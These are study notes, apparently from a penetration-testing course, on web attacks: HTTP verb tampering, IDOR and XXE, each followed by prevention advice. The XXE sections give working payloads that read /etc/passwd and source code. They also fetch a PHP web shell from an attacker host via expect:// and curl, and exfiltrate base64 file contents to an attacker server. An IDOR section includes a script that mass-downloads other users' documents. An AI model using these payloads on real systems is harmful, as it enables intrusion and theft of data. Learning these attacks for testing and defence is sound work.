Protecting web applications is becoming the main focus for most IT departments.
Web attacks now most common attacks against any type of company.
Any external facing server may result in total compromise of the entire company. 
Even if a company has no external facing endpoints they likely use internal web apps or API endpoints which are both vulnerable to the same types of attack. 

## Web Attacks
### HTTP Verb Tampering
Changing the verb in the http request to an unexpected method to bypass security control and authorization mechanisms
### IDOR 
Insecure Direct Object Reference 
Where you are able to bypass authorization and access data not belonging to you by modifying a parameter. 

### XXE XML External Entity
A lot of apps use XML parsing software. Opens up possibility for XXE by poisoning XML FIles. Allows leaking of environment variable and sometimes even source code. 

## Verb Tampering
If web app is not developed to only accept GET/POST we can use other HTTP Verbs to exploit this and possibly gain unauthorized access to a system or bypass security controls.

|           |                                                                                                                                                                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HEAD`    | Identical to a GET request, but its response only contains the `headers`, without the response body                                                                                                                                                           |
| `PUT`     | Writes the request payload to the specified location                                                                                                                                                                                                          |
| `DELETE`  | Deletes the resource at the specified location                                                                                                                                                                                                                |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs                                                                                                                                                                                    |
| `PATCH`   | Apply partial modifications to the resource at the specified location                                                                                                                                                                                         |
| `CONNECT` | The **`CONNECT`** HTTP method requests that a [proxy](https://developer.mozilla.org/en-US/docs/Glossary/Proxy_server) establish a HTTP tunnel to a destination server, and if successful, blindly forward data in both directions until the tunnel is closed. |
| ` TRACE`  | The **`TRACE`** HTTP method performs a message loop-back test along the path to the target resource.                                                                                                                                                          |

PUT may be blocked but patch might not be. 

### Insecure Configurations
A web servers authorization functions may be linked to a certain HTTP method. 
```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

 the configuration specifies both `GET` and `POST` requests for the authentication method, an attacker may still use a different HTTP method (like `HEAD`) to bypass this authentication mechanism altogether

### Insecure Coding
This can occur when a developer applies a filter to a certain HTTP method but forgets to apply it to the rest.

If a website is found to be vulnerable to SQL injection and the developer sanitizes get requests he may leave out PUT and POST 

## Bypassing Basic Authentication
Whilst most automated vulnerability scanners will pick up HTTP Tampering from insecure configurations, it cannot pick up HTTP Tampering from insecure coding.

### Exploit
We can click `Change Request Method` in burp. 
Servers will commonly throw `GET` & `POST` into the same camp. 

The `HEAD` HTML request is identical to the `GET` method but does not return a body, however the scripts function would still be called  

To see which requests the server accepts we can send an `OPTIONS` request.

## Bypassing Security Filters
If a security filter is testing for malicious payloads in a `POST` command it may be possible to change it to get with data field as parameters.

## Prevention 
### Insecure Configuration
Servers can be configured to reject `GET` only important to reject all 9 requests as `HEAD` or `OPTIONS` 

Good practice to ignore all `HEAD` requests unless specifically needed for the server.


##  IDOR
Exists Due to lack of access control on back-end
Many developers skip access-control therefore all users may have access to all other user's data on the back-end 
IDOR function calls exist too its not just focused on data.
If API has exposed admin commands we may be able to access them via our standard user-access. 

## Identifying IDORS 
The first step to exploiting IDORS is finding Direct Object References. Whenever we recieve a specific resource we should study the parameters for user ids or identifiers. 

In the most basic cases we can just increment the user ID 

### AJAX Calls
We may be able to identify unused parameters in JS AJAX calls. 
Apps may place all function calls on the front-end and use the appropriate ones based on user role.

### Understanding Hashing/Encoding
Web apps may not just use numbers and may use encoded or hashed identifiers. 
Commonly uses Base64

If a website is using a hashed call it may not be possible and may be secure. 
If we then look at the source code we may be able to see the hashing protocol and reverse it. Or if we see the Hashing protocol with a naming convention then we can hash other files and make attempts at incrimentation

### Compare User Roles
For more advanced IDORS we may need to register multiple users and compare their requests. 

## Mass IDOR Enumeration
Identify Predictable naming patterns then fuzz for files. 
### Mass Enumeration
Manually Accessing files is not a sustainable method in a real work environment with possibly 1000s of users.

We can curl then filter for `<a> ` tags and then clean with REGEX 
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

For example with a website which shows invoice reports like this 
we can curl the document and Grep for specific strings

```shell
Retrosoda@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

We can then use a for loop to loop over the UID param and wget each document. 
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```


## Bypassing Encoded Filters
Objects often hashed or encoded via md5 or Base64

Download scripts are common practice to avoid directly linking to files and often use hashed references.

We can attempt to hash common values `IE: uid, username, filename`
`Burp comparer` would come in handy.

### Functional Disclosures
Many web developers preform sensitive functions on the front-end which would expose them to attackers. Worth checking the source code for 

## IDORS in insecure APIs
IDOR API function calls allow us to execute functions as another user. ie Change Private info reset passwords, or buy items with another user's payment information.

## Chaining IDOR Vulnerabilities
Possible to find API endpoints which disclose information to be used in other API endpoints.

## IDOR Preventions
### Object-Level Access Control (IDOR)

- **Core Principle**: Access control is critical for web app security. It manages user roles and permissions, ideally through a centralized system like RBAC (Role-Based Access Control).
    
- **RBAC System**: Maps user roles and privileges to objects/resources. Backend checks if the user has sufficient permissions for access.
    
- **Role Mapping**: Each user is assigned roles that define their permissions. The backend uses session tokens to verify privileges.
    
- **Secure Implementation**: Avoid storing sensitive role data in cookies or user-controllable locations. Use backend authentication (e.g., user tokens) to verify roles securely.
    
- **Code Example** (JavaScript):
    `match /api/profile/{userId} {     allow read, write: if user.isAuth == true     && (user.uid == userId || user.roles == 'admin'); }`

### Object Referencing

- **IDOR Issue**: Insecure direct object referencing can lead to enumeration and exploitation of access control flaws.
    
- **Solution**: Use strong, unique references like UUIDs (e.g., UUID V4). Avoid clear-text or predictable references (e.g., uid=1).
    
- **Backend Management**: Generate and store object references (e.g., salted hashes or UUIDs) in the backend.
    
- **Code Example** (PHP):
    `$uid = intval($_REQUEST['uid']); $query = "SELECT url FROM documents where uid=" . $uid;`
- **UUIDs in Practice**: Can obscure IDOR vulnerabilities, making testing harder but more secure when paired with strong access control.

## Intro to XXE
XML Vulnerabilities occur when XML data is taken from controlled user input without sanitizing or parsing which may allow us to use XML features to preform malicious actions. 

### XML 
eXtensible Markup Language (XML) is a common XML markup language like HTML or JSON designed for flexible transfer and storage of data.
Element 

|   |   |   |
|---|---|---|
|`Tag`|The keys of an XML document, usually wrapped with (`<`/`>`) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (`&`/`;`) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"`/`encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|

some characters are used as part of an XML document structure, like `<`, `>`, `&`, or `"`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.

### XML  Document-Type-Declaration
XML allows validation against pre-defined document structure. 
The DTD can be in the XML document or in an external file

*Example DTD*
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
the DTD is declaring the root element with the element declaration then declaring child elements. `#PCDATA` is used for declaring raw data.

The DTD can be placed in the document in the line underneath the XML declaration field. 
Can also be stored in external file (eg email.dtd) and then referenced in the XML document with the SYSTEM keyword 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

its also possible to reference a DTD through a URL:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities 
We can also define custom entities in XML DTDs to allow refactoring of variables and reduce repetitive data. Through the ***Entity Keyword*** 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once defined it can be referenced in an XML document between `&ENTITY;` 
Whenever an entity is referenced it will be replaced with its value by the XML parser.
We can also reference XML Entities with the *SYSTEM* keyword which is followed by the external entity's path. 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


## Local File Disclosure
When webapp trusts unfiltered data from XML input we may be able to reference an external XML DTD document and define new custom XML entities.
Entities may then be used to reference local file to then read that file.

### Identifying 
Finding a web page that accepts XML user input.
***Looking at burp suite requests may reveal an xml form in the post data***
Some other sites may not be as easy to spot.

Outdated XML Libraries do not apply filters or sanitization on our XML Input. 
We need to then check which content will be displayed back to us to take a note of which elements to inject into.

We can define our entity
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Then reference the entity with `&email;`

### Reading Sensitive Files 
we can now read sensitive files with our defined entity by using the `SYSTEM` keyword and define an external reference path 
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### Reading Source Code
We can use the `file://` protocol to reference the source code of PHP
Content may be blocked because of use of XML's special characters `< > &`
we also cannot read binary data as it will not conform to the XML format.

To get around this with PHP's built in `php://filter/` wrapper and specify `convert.base64-encode` as a filter and then link to import resource to get data as base64. 
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## Remote Code Execution with XXE 
possible to gain RCE with XXE. Easiest method would be to utilize a hash stealing trick in Windows-based web applications. 
Possible but unlikely to execute commands on PHP-based web applications through the `PHP://expect` but requires the PHP expect module to be installed. 

If module is installed we can execute basic commands such as `expect://id` if we need to use more complicated commands, XML syntax may break the command and not execute.

Most effecient way of turning XXE into RCE is by fetching a web shell from our server and writing it to web app.
**Create and Serve Webshell**
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

### Other XXE Attacks
SSRF can be carried out through XXE, possible to enumerate local ports and access restricted pages.

Self Referential DOS attacks also possible but patched in most modern web servers. 

## Advanced File Disclosure
### Exfiltration with CDATA
 To output data that doesn't conform to XML format we can wrap content of external file reference with `CDATA` tag eg. ``<![CDATA[ FILE_CONTENT ]]>``. XML parser would consider this part raw data, which may contain any type of data including special characters. 

an easy way to tackle this would be to define a `begin` internal entity with `<![CDATA[` and an `end` internal entity with `]]>` and then place our entry file in between and it should be considered a CDATA element. 

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

after that, if we reference the `&joined;` entity, it should contain our escaped data. but this will not work as XML prevents joining internal and external entities.

To bypass this limitation we can utilize *XML Parameter Entities* a special entity that starts with % character and can only be used with in DTD.

```xml
<!ENTITY joined "%begin;%file;%end;">
```

We can then host this as an external `.dtd` file and storing it on our own web server. 

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

We are then able to obtain source code without encoding it to base64.
Trick can be handy when basic XXE method doesnt work or when dealing with other web dev frameworks.
### Error Based XXE
We may find ourselves in a case where we are blind to the XML output and not able to retrieve the file content using our usual methods. 

If web app displays runtime errors but doesnt have proper exception handling for XML input then we can use this flaw to read output of XXE.

We can malform XML data i.e. `<roo>` instead of `</root>` 

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines *file* parameter and then joins it with an entity that does not exist. 
it will then throw an error as `%nonExistingEntity;` does not exist along with our joined file as part of the error.

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
We can then call from our server request.

May have length limitations and certain special characters may still break it. 

## Blind Data Exfil
How we get content from a server in a completely blind situation

### Out-of-band Data Exfiltration
When no response is given by website and we are ***Blind*** we must utilize a method called *Blind* Out-of-band Data Exfiltration which is often used in similiar cases with blind SQL injection, blind Command injections and blind XSS.

in our previous *Out-Of-Band* attack we hosted the DTD file on our machine and made the web app connect to us. In this methodology we have the web application send a web request to our web server with the content of the file we are using. 

We use a parameter entity utilizing the PHP filter to base64 encode then we create an external parameter and reference our ip and place the file parameter as part of the url value.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
***^Make This on our system***
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.138:8000/xmltest.dtd">
  %remote;
  %oob;
]>
```
it will then attempt to reach `http://OURIP:8000/ENCODEDDATA` and then we can decode that. 

We can also use *DNS OOB Exfiltration* by placing the encoded data as a subdomain to our URL and then use TCPDUMP to capture any incoming traffic. 

### Automated OOB Exfiltration
Automated tool [XXEinjector](https://github.com/enjoiz/XXEinjector) 

## XXE Prevention
Update XML Parsers
- Disable referencing custom `Document Type Definitions (DTDs)`
- Disable referencing `External XML Entities`
- Disable `Parameter Entity` processing
- Disable support for `XInclude`
- Prevent `Entity Reference Loops`
